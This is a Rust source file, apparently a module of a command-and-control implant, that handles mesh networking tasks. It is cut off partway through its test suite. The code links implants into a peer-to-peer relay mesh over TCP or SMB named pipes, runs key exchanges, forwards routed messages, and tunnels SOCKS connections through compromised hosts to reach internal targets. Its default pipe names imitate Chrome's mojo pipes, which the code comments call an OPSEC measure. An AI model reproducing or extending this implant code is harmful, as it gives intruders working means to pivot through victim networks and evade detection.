//! Mesh module task handler
//!
//! Enabled via the `mod-mesh` feature flag.
//! Handles MeshTask dispatch to mod-mesh module for peer-to-peer networking.

use crate::error::{ImplantError, ImplantResult};
use mesh::{LinkStats, MeshTransport, PeerLink, PeerLinkState};
use prost::Message;
use protocol::{MeshTask, MeshTransportType, MeshRoleType};
use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::{OnceLock, RwLock};
use tracing::{debug, info, warn, error};

// ---------------------------------------------------------------------------
// SOCKS channel registry for mesh tunneling
// ---------------------------------------------------------------------------

/// Registry of active SOCKS channels (channel_id -> TcpStream to target)
static SOCKS_CHANNELS: OnceLock<RwLock<HashMap<u32, TcpStream>>> = OnceLock::new();

fn socks_channels() -> &'static RwLock<HashMap<u32, TcpStream>> {
    SOCKS_CHANNELS.get_or_init(|| RwLock::new(HashMap::new()))
}

/// Register a SOCKS channel with its target stream
fn register_socks_channel(channel_id: u32, stream: TcpStream) {
    if let Ok(mut channels) = socks_channels().write() {
        channels.insert(channel_id, stream);
    }
}

/// Get a mutable reference to a SOCKS channel stream
fn get_socks_channel(channel_id: u32) -> Option<TcpStream> {
    socks_channels().write().ok()?.remove(&channel_id)
}

/// Remove and close a SOCKS channel
fn close_socks_channel(channel_id: u32) {
    if let Ok(mut channels) = socks_channels().write() {
        if let Some(stream) = channels.remove(&channel_id) {
            let _ = stream.shutdown(std::net::Shutdown::Both);
        }
    }
}

/// Execute a mesh task using mod-mesh module
pub fn execute_mesh_module(task_data: &[u8]) -> ImplantResult<Vec<u8>> {
    // Decode MeshTask from protobuf
    let mesh_task = MeshTask::decode(task_data)
        .map_err(|e| ImplantError::Protocol(format!("invalid mesh task: {}", e)))?;

    let operation = mesh_task
        .operation
        .ok_or_else(|| ImplantError::Task("mesh task missing operation".into()))?;

    match operation {
        protocol::mesh_task::Operation::Connect(connect) => {
            execute_mesh_connect(connect)
        }
        protocol::mesh_task::Operation::Disconnect(disconnect) => {
            execute_mesh_disconnect(disconnect)
        }
        protocol::mesh_task::Operation::SetRole(set_role) => {
            execute_mesh_set_role(set_role)
        }
        protocol::mesh_task::Operation::GetTopology(_) => {
            execute_mesh_get_topology()
        }
        protocol::mesh_task::Operation::Relay(relay) => {
            execute_mesh_relay(relay)
        }
        protocol::mesh_task::Operation::Listen(listen) => {
            execute_mesh_listen(listen)
        }
        protocol::mesh_task::Operation::SocksConnect(socks_connect) => {
            execute_socks_connect(socks_connect)
        }
        protocol::mesh_task::Operation::SocksData(socks_data) => {
            execute_socks_data(socks_data)
        }
    }
}

/// Handle mesh connect operation - establish peer link
fn execute_mesh_connect(connect: protocol::MeshConnect) -> ImplantResult<Vec<u8>> {
    use common::ImplantId;

    let peer_id = ImplantId::from_bytes(&connect.peer_id)
        .map_err(|e| ImplantError::Task(format!("invalid peer_id: {}", e)))?;

    let transport = match MeshTransportType::try_from(connect.transport) {
        Ok(MeshTransportType::MeshTransportTcp) => "tcp",
        Ok(MeshTransportType::MeshTransportSmb) => "smb",
        Ok(MeshTransportType::MeshTransportUnknown) | Err(_) => return Err(ImplantError::Task("invalid transport type".into())),
    };

    info!(
        peer_id = %peer_id,
        transport = transport,
        address = %connect.address,
        port = connect.port,
        "Initiating mesh connection"
    );

    // Generate ephemeral keypair for handshake
    let our_keypair = crypto::generate_keypair()
        .map_err(|e| ImplantError::Crypto(format!("keypair generation failed: {}", e)))?;

    // Connect based on transport type
    match MeshTransportType::try_from(connect.transport).unwrap() {
        MeshTransportType::MeshTransportTcp => {
            // TCP connection and handshake
            let mut tcp_conn = mod_mesh::tcp::connect(
                &connect.address,
                connect.port as u16,
            ).map_err(|e| ImplantError::Transport(format!("tcp connect failed: {}", e)))?;

            let handshake_result = mod_mesh::initiate_handshake(
                &mut tcp_conn,
                &our_keypair,
                None, // No expected peer key verification for now
            ).map_err(|e| ImplantError::Crypto(format!("handshake failed: {}", e)))?;

            // Register connection for future message relay
            mod_mesh::tcp::register(peer_id, tcp_conn);

            // Register for keepalive monitoring
            mod_mesh::keepalive::register_peer(peer_id);

            // Register link with global relay for multi-hop routing
            if let Some(relay) = mod_mesh::try_global_relay() {
                let link = PeerLink {
                    peer_id,
                    transport: MeshTransport::Tcp,
                    state: PeerLinkState::Active,
                    session_key: handshake_result.session_key.clone(),
                    nonce_counter: 0,
                    stats: LinkStats::default(),
                    last_activity: chrono::Utc::now().timestamp_millis(),
                };
                if let Err(e) = relay.add_link(peer_id, link) {
                    warn!(error = %e, "Failed to register link with relay");
                }
            }

            debug!(
                peer_id = %peer_id,
                "Mesh handshake completed, session key derived"
            );

            // Return success with peer public key
            Ok(handshake_result.peer_public_key.as_bytes().to_vec())
        }
        MeshTransportType::MeshTransportSmb => {
            // SMB named pipe connection and handshake
            let pipe_name = if connect.pipe_name.is_empty() {
                "kraken"
            } else {
                &connect.pipe_name
            };

            let mut smb_conn = mod_mesh::smb::connect(
                &connect.address,
                pipe_name,
            ).map_err(|e| ImplantError::Transport(format!("smb connect failed: {}", e)))?;

            let handshake_result = mod_mesh::initiate_handshake(
                &mut smb_conn,
                &our_keypair,
                None,
            ).map_err(|e| ImplantError::Crypto(format!("handshake failed: {}", e)))?;

            // Register connection for future message relay
            mod_mesh::smb::register(peer_id, smb_conn);

            // Register for keepalive monitoring
            mod_mesh::keepalive::register_peer(peer_id);

            // Register link with global relay for multi-hop routing
            if let Some(relay) = mod_mesh::try_global_relay() {
                let link = PeerLink {
                    peer_id,
                    transport: MeshTransport::Smb,
                    state: PeerLinkState::Active,
                    session_key: handshake_result.session_key.clone(),
                    nonce_counter: 0,
                    stats: LinkStats::default(),
                    last_activity: chrono::Utc::now().timestamp_millis(),
                };
                if let Err(e) = relay.add_link(peer_id, link) {
                    warn!(error = %e, "Failed to register link with relay");
                }
            }

            debug!(
                peer_id = %peer_id,
                "Mesh handshake completed over SMB"
            );

            Ok(handshake_result.peer_public_key.as_bytes().to_vec())
        }
        MeshTransportType::MeshTransportUnknown => {
            Err(ImplantError::Task("invalid transport type".into()))
        }
    }
}

/// Handle mesh disconnect operation - tear down peer link
fn execute_mesh_disconnect(disconnect: protocol::MeshDisconnect) -> ImplantResult<Vec<u8>> {
    use common::ImplantId;

    let peer_id = ImplantId::from_bytes(&disconnect.peer_id)
        .map_err(|e| ImplantError::Task(format!("invalid peer_id: {}", e)))?;

    info!(peer_id = %peer_id, "Disconnecting mesh peer");

    // Unregister from keepalive monitoring
    mod_mesh::keepalive::unregister_peer(&peer_id);

    // Disconnect from both transport types (only one will have the connection)
    mod_mesh::tcp::disconnect(peer_id);
    mod_mesh::smb::disconnect(peer_id);

    Ok(vec![])
}

/// Global mesh role state
static MESH_ROLE: std::sync::atomic::AtomicU8 = std::sync::atomic::AtomicU8::new(0);

/// Get the current mesh role
pub fn get_mesh_role() -> MeshRoleType {
    match MESH_ROLE.load(std::sync::atomic::Ordering::SeqCst) {
        1 => MeshRoleType::MeshRoleRelay,
        2 => MeshRoleType::MeshRoleHub,
        _ => MeshRoleType::MeshRoleLeaf,
    }
}

/// Handle mesh set role operation
fn execute_mesh_set_role(set_role: protocol::MeshSetRole) -> ImplantResult<Vec<u8>> {
    let (role_name, role_val) = match MeshRoleType::try_from(set_role.role) {
        Ok(MeshRoleType::MeshRoleLeaf) => ("leaf", 0u8),
        Ok(MeshRoleType::MeshRoleRelay) => ("relay", 1u8),
        Ok(MeshRoleType::MeshRoleHub) => ("hub", 2u8),
        Err(_) => return Err(ImplantError::Task("invalid mesh role".into())),
    };

    MESH_ROLE.store(role_val, std::sync::atomic::Ordering::SeqCst);
    info!(role = role_name, "Mesh role updated");

    // Return acknowledgment with new role
    let response = protocol::MeshTopologyReport {
        role: set_role.role,
        peers: vec![],
    };
    Ok(protocol::encode(&response))
}

/// Handle mesh get topology request
fn execute_mesh_get_topology() -> ImplantResult<Vec<u8>> {
    debug!("Getting mesh topology");

    // Collect connected TCP peers
    let tcp_peers = collect_tcp_peer_ids();

    // Build peer info list
    let peers: Vec<protocol::MeshPeerReport> = tcp_peers
        .into_iter()
        .map(|peer_id| protocol::MeshPeerReport {
            peer_id: peer_id.as_bytes().to_vec(),
            transport: MeshTransportType::MeshTransportTcp as i32,
            link_state: protocol::MeshLinkState::MeshLinkActive as i32,
            last_seen: chrono::Utc::now().timestamp_millis(),
            messages_sent: 0,
            messages_received: 0,
            latency_ms: 0,
        })
        .collect();

    let current_role = get_mesh_role();
    debug!(role = ?current_role, peer_count = peers.len(), "Topology report");

    let response = protocol::MeshTopologyReport {
        role: current_role as i32,
        peers,
    };

    Ok(protocol::encode(&response))
}

/// Collect peer IDs from TCP connection registry
fn collect_tcp_peer_ids() -> Vec<common::ImplantId> {
    mod_mesh::tcp::list_peers()
}

/// Handle mesh relay operation - forward encrypted message to next hop
///
/// The MeshRelay message contains a serialized MeshMessage (not yet encrypted).
/// We determine the next hop from the routing header and encrypt/send to that peer.
fn execute_mesh_relay(relay: protocol::MeshRelay) -> ImplantResult<Vec<u8>> {
    if relay.message.is_empty() {
        return Err(ImplantError::Task("empty relay message".into()));
    }

    debug!(
        message_len = relay.message.len(),
        "Processing mesh relay message"
    );

    // Get the global relay instance
    let mesh_relay = mod_mesh::try_global_relay()
        .ok_or_else(|| ImplantError::Task("mesh relay not initialized".into()))?;

    // Parse the message to determine routing
    // The message bytes are a serialized MeshMessage
    let mesh_message = mod_mesh::relay::deserialize_mesh_message_public(&relay.message)
        .map_err(|e| ImplantError::Task(format!("invalid mesh message: {}", e)))?;

    // Check if we're at the final destination
    if mesh_message.routing.is_final_hop() {
        match &mesh_message.routing.destination {
            mesh::MeshDestination::Implant(dest_id) => {
                // Check if we're the destination
                let our_id = get_our_implant_id()?;
                if *dest_id == our_id {
                    debug!("Message reached final destination (us)");
                    // Queue for local processing
                    if let Ok(mut queue) = mesh_relay.inbound_queue.write() {
                        queue.push(mesh_message);
                    }
                    return Ok(vec![0x01]); // Success: delivered locally
                } else {
                    return Err(ImplantError::Task(format!(
                        "final hop but dest {} != us", dest_id
                    )));
                }
            }
            mesh::MeshDestination::Server => {
                // We need to queue this for server delivery
                debug!("Message destined for server, queuing");
                mesh_relay.queue_for_server(mesh_message);
                return Ok(vec![0x02]); // Success: queued for server
            }
        }
    }

    // Not final hop - need to forward to next peer
    let next_hop = mesh_message.routing.next_hop()
        .ok_or_else(|| ImplantError::Task("no next hop in routing path".into()))?;

    debug!(next_hop = %next_hop, ttl = mesh_message.routing.ttl, "Forwarding to next hop");

    // Advance the routing header (decrements TTL, advances hop_index)
    let mut forwarded = mesh_message;
    forwarded.routing.advance();

    // Send to the next peer (encrypts and transmits)
    mesh_relay.send_to_peer(next_hop, &forwarded)
        .map_err(|e| ImplantError::Task(format!("relay to {} failed: {}", next_hop, e)))?;

    Ok(vec![0x03]) // Success: forwarded
}

/// Get our implant ID from config
fn get_our_implant_id() -> ImplantResult<common::ImplantId> {
    // This should be available from the implant config
    // For now, we'll use a placeholder that should be set at startup
    static OUR_ID: std::sync::OnceLock<common::ImplantId> = std::sync::OnceLock::new();
    OUR_ID.get()
        .copied()
        .ok_or_else(|| ImplantError::Task("implant ID not configured".into()))
}

/// Set our implant ID (called during startup)
pub fn set_our_implant_id(id: common::ImplantId) {
    static OUR_ID: std::sync::OnceLock<common::ImplantId> = std::sync::OnceLock::new();
    let _ = OUR_ID.set(id);
}

/// Handle mesh listen operation - start TCP/SMB listener for incoming peers
fn execute_mesh_listen(listen: protocol::MeshListen) -> ImplantResult<Vec<u8>> {
    let transport = match MeshTransportType::try_from(listen.transport) {
        Ok(MeshTransportType::MeshTransportTcp) => "tcp",
        Ok(MeshTransportType::MeshTransportSmb) => "smb",
        Ok(MeshTransportType::MeshTransportUnknown) | Err(_) => {
            return Err(ImplantError::Task("invalid transport type for listen".into()))
        }
    };

    let bind_addr = if listen.bind_address.is_empty() {
        "0.0.0.0"
    } else {
        &listen.bind_address
    };

    info!(
        transport = transport,
        bind_address = bind_addr,
        port = listen.port,
        "Starting mesh listener"
    );

    match MeshTransportType::try_from(listen.transport).unwrap() {
        MeshTransportType::MeshTransportTcp => {
            // Bind TCP listener
            let server = mod_mesh::tcp::TcpServer::bind(bind_addr, listen.port as u16)
                .map_err(|e| ImplantError::Transport(format!("tcp bind failed: {}", e)))?;

            // Spawn accept loop in background thread
            std::thread::spawn(move || {
                loop {
                    match server.accept() {
                        Ok(Some(stream)) => {
                            // Handle each connection in its own thread
                            std::thread::spawn(move || {
                                if let Err(e) = handle_incoming_tcp_connection(stream) {
                                    warn!(error = %e, "incoming connection failed");
                                }
                            });
                        }
                        Ok(None) => {
                            // WouldBlock - sleep briefly and retry
                            std::thread::sleep(std::time::Duration::from_millis(100));
                        }
                        Err(e) => {
                            error!(error = %e, "accept failed");
                            break;
                        }
                    }
                }
            });

            info!(port = listen.port, "TCP mesh listener started");
            Ok(vec![])
        }
        MeshTransportType::MeshTransportSmb => {
            // SMB named pipe listener
            // Default: Chrome-like mojo pipe name for OPSEC (very common on Windows)
            let generated_name;
            let pipe_name = if listen.pipe_name.is_empty() {
                let pid = std::process::id();
                let rand_suffix: u64 = {
                    let mut buf = [0u8; 8];
                    let _ = crypto::random_bytes(&mut buf);
                    u64::from_le_bytes(buf)
                };
                generated_name = format!("mojo.{}.{}.{}", pid, rand_suffix % 1000000, rand_suffix >> 32);
                &generated_name
            } else {
                &listen.pipe_name
            };

            let server = mod_mesh::smb::SmbServer::bind(pipe_name)
                .map_err(|e| ImplantError::Transport(format!("smb bind failed: {}", e)))?;

            let pipe_name_owned = pipe_name.to_string();

            // Spawn accept loop in background thread
            std::thread::spawn(move || {
                info!(pipe_name = %pipe_name_owned, "SMB mesh listener started");

                loop {
                    match server.accept() {
                        Ok(conn) => {
                            // Handle each connection in its own thread
                            std::thread::spawn(move || {
                                if let Err(e) = handle_incoming_smb_connection(conn) {
                                    warn!(error = %e, "incoming SMB connection failed");
                                }
                            });
                        }
                        Err(e) => {
                            error!(error = %e, "SMB accept failed");
                            // Brief sleep before retry on error
                            std::thread::sleep(std::time::Duration::from_millis(100));
                        }
                    }
                }
            });

            info!(pipe_name = pipe_name, "SMB mesh listener started");
            Ok(vec![])
        }
        MeshTransportType::MeshTransportUnknown => {
            Err(ImplantError::Task("invalid transport type".into()))
        }
    }
}

/// Handle an incoming TCP connection: handshake and register
fn handle_incoming_tcp_connection(stream: std::net::TcpStream) -> ImplantResult<()> {
    use common::ImplantId;

    let peer_addr = stream.peer_addr()
        .map(|a| a.to_string())
        .unwrap_or_else(|_| "unknown".to_string());

    debug!(peer = %peer_addr, "Incoming mesh connection");

    // Wrap stream in TcpConnection
    let mut tcp_conn = mod_mesh::tcp::TcpConnection::new(stream)
        .map_err(|e| ImplantError::Transport(format!("connection setup failed: {}", e)))?;

    // Generate our ephemeral keypair for this connection
    let our_keypair = crypto::generate_keypair()
        .map_err(|e| ImplantError::Crypto(format!("keypair generation failed: {}", e)))?;

    // Perform responder-side handshake
    let handshake_result = mod_mesh::respond_handshake(&mut tcp_conn, &our_keypair)
        .map_err(|e| ImplantError::Crypto(format!("handshake failed: {}", e)))?;

    // Derive peer ID from their public key (first 16 bytes of SHA256)
    let peer_pubkey_hash = crypto::sha256(handshake_result.peer_public_key.as_bytes());
    let peer_id = ImplantId::from_bytes(&peer_pubkey_hash[..16])
        .map_err(|e| ImplantError::Task(format!("failed to derive peer id: {}", e)))?;

    // Register connection for future message relay
    mod_mesh::tcp::register(peer_id, tcp_conn);

    // Register for keepalive monitoring
    mod_mesh::keepalive::register_peer(peer_id);

    info!(
        peer_id = %peer_id,
        peer_addr = %peer_addr,
        "Mesh peer connected and registered"
    );

    Ok(())
}

/// Handle an incoming SMB connection: handshake and register
fn handle_incoming_smb_connection(mut smb_conn: mod_mesh::smb::SmbConnection) -> ImplantResult<()> {
    use common::ImplantId;

    debug!("Incoming SMB mesh connection");

    // Generate our ephemeral keypair for this connection
    let our_keypair = crypto::generate_keypair()
        .map_err(|e| ImplantError::Crypto(format!("keypair generation failed: {}", e)))?;

    // Perform responder-side handshake
    let handshake_result = mod_mesh::respond_handshake(&mut smb_conn, &our_keypair)
        .map_err(|e| ImplantError::Crypto(format!("handshake failed: {}", e)))?;

    // Derive peer ID from their public key (first 16 bytes of SHA256)
    let peer_pubkey_hash = crypto::sha256(handshake_result.peer_public_key.as_bytes());
    let peer_id = ImplantId::from_bytes(&peer_pubkey_hash[..16])
        .map_err(|e| ImplantError::Task(format!("failed to derive peer id: {}", e)))?;

    // Register connection for future message relay
    mod_mesh::smb::register(peer_id, smb_conn);

    // Register for keepalive monitoring
    mod_mesh::keepalive::register_peer(peer_id);

    info!(
        peer_id = %peer_id,
        "SMB mesh peer connected and registered"
    );

    Ok(())
}

/// Handle SOCKS connect request from mesh peer - establish connection to target
fn execute_socks_connect(socks_connect: protocol::MeshSocksConnect) -> ImplantResult<Vec<u8>> {
    let channel_id = socks_connect.channel_id;
    let target_host = &socks_connect.target_host;
    let target_port = socks_connect.target_port as u16;

    info!(
        channel_id = channel_id,
        target = %format!("{}:{}", target_host, target_port),
        "Processing SOCKS connect request"
    );

    // Attempt to connect to the target
    match mod_mesh::socks::handle_socks_connect(target_host, target_port) {
        Ok(stream) => {
            let local_addr = stream.local_addr()
                .map(|a| a.to_string())
                .unwrap_or_else(|_| "0.0.0.0:0".to_string());
            let bound_port = stream.local_addr().map(|a| a.port() as u32).unwrap_or(0);

            // Set non-blocking for async data relay
            if let Err(e) = stream.set_nonblocking(true) {
                warn!(channel_id = channel_id, error = %e, "Failed to set non-blocking mode");
            }

            // Store the stream for subsequent SocksData operations
            register_socks_channel(channel_id, stream);

            info!(
                channel_id = channel_id,
                bound_addr = %local_addr,
                "SOCKS connection established and registered"
            );

            // Build success response
            let response = protocol::MeshSocksResponse {
                channel_id,
                success: true,
                error: String::new(),
                bound_addr: local_addr,
                bound_port,
            };

            Ok(protocol::encode(&response))
        }
        Err(e) => {
            warn!(
                channel_id = channel_id,
                error = %e,
                "SOCKS connect failed"
            );

            let response = protocol::MeshSocksResponse {
                channel_id,
                success: false,
                error: e.to_string(),
                bound_addr: String::new(),
                bound_port: 0,
            };

            Ok(protocol::encode(&response))
        }
    }
}

/// Handle SOCKS data relay through mesh
///
/// This function handles bidirectional data flow:
/// - If data is provided, write it to the target stream
/// - Read any available response data from the target
/// - Return response data (or empty if none available)
fn execute_socks_data(socks_data: protocol::MeshSocksData) -> ImplantResult<Vec<u8>> {
    let channel_id = socks_data.channel_id;

    debug!(
        channel_id = channel_id,
        data_len = socks_data.data.len(),
        eof = socks_data.eof,
        "Processing SOCKS data"
    );

    // Handle EOF - close the channel
    if socks_data.eof {
        info!(channel_id = channel_id, "SOCKS channel EOF, closing");
        close_socks_channel(channel_id);
        return Ok(vec![]);
    }

    // Get the channel stream (temporarily removes from registry)
    let mut stream = match get_socks_channel(channel_id) {
        Some(s) => s,
        None => {
            // Channel not found - may have been closed or never opened
            // Return empty acknowledgment for graceful degradation
            debug!(channel_id = channel_id, "SOCKS channel not found, ignoring data");
            return Ok(vec![]);
        }
    };

    // Write incoming data to target if present
    if !socks_data.data.is_empty() {
        if let Err(e) = stream.write_all(&socks_data.data) {
            warn!(channel_id = channel_id, error = %e, "Failed to write to target");
            // Don't re-register, channel is broken
            return Err(ImplantError::Transport(format!("write failed: {}", e)));
        }
        let _ = stream.flush();
    }

    // Read any available response data from target
    let mut response_data = Vec::new();
    let mut buf = [0u8; 8192];

    // Set a brief read timeout to avoid blocking
    let _ = stream.set_read_timeout(Some(std::time::Duration::from_millis(10)));

    loop {
        match stream.read(&mut buf) {
            Ok(0) => {
                // EOF from target - channel closed
                info!(channel_id = channel_id, "Target closed connection");
                // Return what we have with EOF indication
                let response = protocol::MeshSocksData {
                    channel_id,
                    data: response_data,
                    eof: true,
                };
                return Ok(protocol::encode(&response));
            }
            Ok(n) => {
                response_data.extend_from_slice(&buf[..n]);
                // Keep reading while data is available
                if n < buf.len() {
                    break;
                }
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                // No more data available right now
                break;
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::TimedOut => {
                // Timeout, no more data
                break;
            }
            Err(e) => {
                warn!(channel_id = channel_id, error = %e, "Read error from target");
                // Channel may be broken, don't re-register
                return Err(ImplantError::Transport(format!("read failed: {}", e)));
            }
        }
    }

    // Re-register the stream for future operations
    register_socks_channel(channel_id, stream);

    // Return response data (may be empty if no data available yet)
    if response_data.is_empty() {
        Ok(vec![])
    } else {
        debug!(channel_id = channel_id, response_len = response_data.len(), "Returning data from target");
        let response = protocol::MeshSocksData {
            channel_id,
            data: response_data,
            eof: false,
        };
        Ok(protocol::encode(&response))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::thread;
    use std::time::Duration;

    /// Integration test: listen → connect → handshake → register
    #[test]
    fn test_mesh_listen_accept_handshake_flow() {
        // Start listener on random port
        let server = mod_mesh::tcp::TcpServer::bind("127.0.0.1", 0).unwrap();
        let port = server.local_addr().unwrap().port();

        // Spawn accept loop (simplified - single connection)
        let accept_handle = thread::spawn(move || {
            // Wait for connection with timeout
            for _ in 0..50 {
                if let Ok(Some(stream)) = server.accept() {
                    return handle_incoming_tcp_connection(stream);
                }
                thread::sleep(Duration::from_millis(10));
            }
            Err(ImplantError::Transport("accept timeout".into()))
        });

        // Give server time to start
        thread::sleep(Duration::from_millis(50));

        // Connect as client and perform initiator handshake
        let client_handle = thread::spawn(move || {
            let mut conn = mod_mesh::tcp::connect("127.0.0.1", port).unwrap();
            let keypair = crypto::generate_keypair().unwrap();
            let result = mod_mesh::initiate_handshake(&mut conn, &keypair, None).unwrap();
            (keypair.0, result)
        });

        // Wait for both sides
        let accept_result = accept_handle.join().unwrap();
        let (client_pubkey, handshake_result) = client_handle.join().unwrap();

        // Verify handshake succeeded on server side
        assert!(accept_result.is_ok(), "accept should succeed: {:?}", accept_result);

        // Verify peer was registered - derive expected peer ID
        let client_pubkey_hash = crypto::sha256(client_pubkey.as_bytes());
        let expected_peer_id = common::ImplantId::from_bytes(&client_pubkey_hash[..16]).unwrap();
        assert!(mod_mesh::tcp::is_connected(&expected_peer_id), "peer should be registered");

        // Cleanup
        mod_mesh::tcp::disconnect(expected_peer_id);
    }

    /// Unit test: execute_mesh_listen with TCP transport returns Ok
    #[test]
    fn test_mesh_listen_tcp_starts_listener() {
        let listen = protocol::MeshListen {
            transport: MeshTransportType::MeshTransportTcp as i32,
            bind_address: "127.0.0.1".to_string(),
            port: 0,
            pipe_name: String::new(),
        };

        let result = execute_mesh_listen(listen);
        assert!(result.is_ok(), "TCP listen should succeed: {:?}", result);
        assert_eq!(result.unwrap(), Vec::<u8>::new(), "should return empty payload");
    }

    /// Unit test: execute_mesh_listen with invalid transport returns Err
    #[test]
    fn test_mesh_listen_invalid_transport() {
        let listen = protocol::MeshListen {
            transport: MeshTransportType::MeshTransportUnknown as i32,
            bind_address: "127.0.0.1".to_string(),
            port: 9999,
            pipe_name: String::new(),
        };

        let result = execute_mesh_listen(listen);
        assert!(result.is_err(), "unknown transport should return an error");

        match result.unwrap_err() {
            ImplantError::Task(msg) => {
                assert!(msg.contains("invalid transport"), "error message should describe invalid transport, got: {}", msg);
            }
            other => panic!("expected ImplantError::Task, got {:?}", other),
        }
    }

    /// Unit test: execute_mesh_connect with MeshTransportUnknown returns Err
    #[test]
    fn test_mesh_connect_invalid_transport() {
        let connect = protocol::MeshConnect {
            peer_id: vec![0u8; 16],
            transport: MeshTransportType::MeshTransportUnknown as i32,
            address: "127.0.0.1".to_string(),
            port: 9999,
            pipe_name: String::new(),
            peer_public_key: vec![],
        };

        let result = execute_mesh_connect(connect);
        assert!(result.is_err(), "unknown transport should return an error");

        match result.unwrap_err() {
            ImplantError::Task(msg) => {
                assert!(
                    msg.contains("invalid transport"),
                    "error message should describe invalid transport, got: {}",
                    msg
                );
            }
            other => panic!("expected ImplantError::Task, got {:?}", other),
        }
    }

    /// Unit test: execute_mesh_connect with wrong-length peer_id returns Err
    #[test]
    fn test_mesh_connect_invalid_peer_id() {
        // ImplantId::from_bytes expects exactly 16 bytes; supply a wrong length
        let connect = protocol::MeshConnect {
            peer_id: vec![0xABu8; 7], // too short
            transport: MeshTransportType::MeshTransportTcp as i32,
            address: "127.0.0.1".to_string(),
            port: 9999,
            pipe_name: String::new(),
            peer_public_key: vec![],
        };

        let result = execute_mesh_connect(connect);
        assert!(result.is_err(), "malformed peer_id should return an error");

        match result.unwrap_err() {
            ImplantError::Task(msg) => {
                assert!(
                    msg.contains("invalid peer_id"),
                    "error message should describe invalid peer_id, got: {}",
                    msg
                );
            }
            other => panic!("expected ImplantError::Task, got {:?}", other),
        }
    }

    /// Unit test: execute_mesh_connect with TCP to unreachable address returns transport error
    #[test]
    fn test_mesh_connect_tcp_connection_failure() {
        // Port 1 on 192.0.2.0/24 (TEST-NET-1, RFC 5737) is guaranteed unreachable
        let connect = protocol::MeshConnect {
            peer_id: vec![0u8; 16],
            transport: MeshTransportType::MeshTransportTcp as i32,
            address: "192.0.2.1".to_string(),
            port: 1,
            pipe_name: String::new(),
            peer_public_key: vec![],
        };

        let result = execute_mesh_connect(connect);
        assert!(result.is_err(), "connection to unreachable address should fail");

        match result.unwrap_err() {
            ImplantError::Transport(msg) => {
                assert!(
                    msg.contains("tcp connect failed"),
                    "error message should describe tcp connect failure, got: {}",
                    msg
                );
            }
            other => panic!("expected ImplantError::Transport, got {:?}", other),
        }
    }

    /// Set role to Leaf, verify MESH_ROLE atomic is 0, verify response
    #[test]
    fn test_mesh_set_role_leaf() {
        // Reset to a known non-zero state first
        MESH_ROLE.store(2, std::sync::atomic::Ordering::SeqCst);

        let set_role = protocol::MeshSetRole {
            role: MeshRoleType::MeshRoleLeaf as i32,
        };

        let result = execute_mesh_set_role(set_role);
        assert!(result.is_ok(), "execute_mesh_set_role(Leaf) should succeed: {:?}", result);

        assert_eq!(
            MESH_ROLE.load(std::sync::atomic::Ordering::SeqCst),
            0,
            "MESH_ROLE should be 0 for Leaf"
        );

        let bytes = result.unwrap();
        let report = protocol::MeshTopologyReport::decode(bytes.as_slice())
            .expect("response should decode as MeshTopologyReport");
        assert_eq!(report.role, MeshRoleType::MeshRoleLeaf as i32);
        assert!(report.peers.is_empty());
    }

    /// Set role to Relay, verify MESH_ROLE atomic is 1
    #[test]
    fn test_mesh_set_role_relay() {
        MESH_ROLE.store(0, std::sync::atomic::Ordering::SeqCst);

        let set_role = protocol::MeshSetRole {
            role: MeshRoleType::MeshRoleRelay as i32,
        };

        let result = execute_mesh_set_role(set_role);
        assert!(result.is_ok(), "execute_mesh_set_role(Relay) should succeed: {:?}", result);

        assert_eq!(
            MESH_ROLE.load(std::sync::atomic::Ordering::SeqCst),
            1,
            "MESH_ROLE should be 1 for Relay"
        );

        let bytes = result.unwrap();
        let report = protocol::MeshTopologyReport::decode(bytes.as_slice())
            .expect("response should decode as MeshTopologyReport");
        assert_eq!(report.role, MeshRoleType::MeshRoleRelay as i32);
    }

    /// Set role to Hub, verify MESH_ROLE atomic is 2
    #[test]
    fn test_mesh_set_role_hub() {
        MESH_ROLE.store(0, std::sync::atomic::Ordering::SeqCst);

        let set_role = protocol::MeshSetRole {
            role: MeshRoleType::MeshRoleHub as i32,
        };

        let result = execute_mesh_set_role(set_role);
        assert!(result.is_ok(), "execute_mesh_set_role(Hub) should succeed: {:?}", result);

        assert_eq!(
            MESH_ROLE.load(std::sync::atomic::Ordering::SeqCst),
            2,
            "MESH_ROLE should be 2 for Hub"
        );

        let bytes = result.unwrap();
        let report = protocol::MeshTopologyReport::decode(bytes.as_slice())
            .expect("response should decode as MeshTopologyReport");
        assert_eq!(report.role, MeshRoleType::MeshRoleHub as i32);
    }

    /// Verify get_mesh_role() returns the correct MeshRoleType for each atomic value
    #[test]
    fn test_mesh_get_role_returns_correct_type() {
        MESH_ROLE.store(0, std::sync::atomic::Ordering::SeqCst);
        assert_eq!(get_mesh_role(), MeshRoleType::MeshRoleLeaf, "0 -> Leaf");

        MESH_ROLE.store(1, std::sync::atomic::Ordering::SeqCst);
        assert_eq!(get_mesh_role(), MeshRoleType::MeshRoleRelay, "1 -> Relay");

        MESH_ROLE.store(2, std::sync::atomic::Ordering::SeqCst);
        assert_eq!(get_mesh_role(), MeshRoleType::MeshRoleHub, "2 -> Hub");

        // Any out-of-range value falls through the `_` arm and returns Leaf
        MESH_ROLE.store(99, std::sync::atomic::Ordering::SeqCst);
        assert_eq!(get_mesh_role(), MeshRoleType::MeshRoleLeaf, "unknown -> Leaf fallback");
    }

    /// Stress test: multiple concurrent connections
    #[test]
    fn test_mesh_listen_concurrent_connections() {
        let server = mod_mesh::tcp::TcpServer::bind("127.0.0.1", 0).unwrap();
        let port = server.local_addr().unwrap().port();
        let num_clients = 5;

        // Spawn accept loop that handles multiple connections
        let accept_handle = thread::spawn(move || {
            let mut accepted = 0;
            for _ in 0..500 {
                if let Ok(Some(stream)) = server.accept() {
                    let _ = thread::spawn(move || {
                        handle_incoming_tcp_connection(stream)
                    });
                    accepted += 1;
                    if accepted >= num_clients {
                        break;
                    }
                }
                thread::sleep(Duration::from_millis(10));
            }
            accepted
        });

        thread::sleep(Duration::from_millis(50));

        // Spawn multiple clients
        let mut client_handles = vec![];
        for _ in 0..num_clients {
            let handle = thread::spawn(move || {
                let mut conn = mod_mesh::tcp::connect("127.0.0.1", port).unwrap();
                let keypair = crypto::generate_keypair().unwrap();
                let _ = mod_mesh::initiate_handshake(&mut conn, &keypair, None).unwrap();
                keypair.0
            });
            client_handles.push(handle);
        }

        // Collect client public keys
        let mut peer_ids = vec![];
        for handle in client_handles {
            let pubkey = handle.join().unwrap();
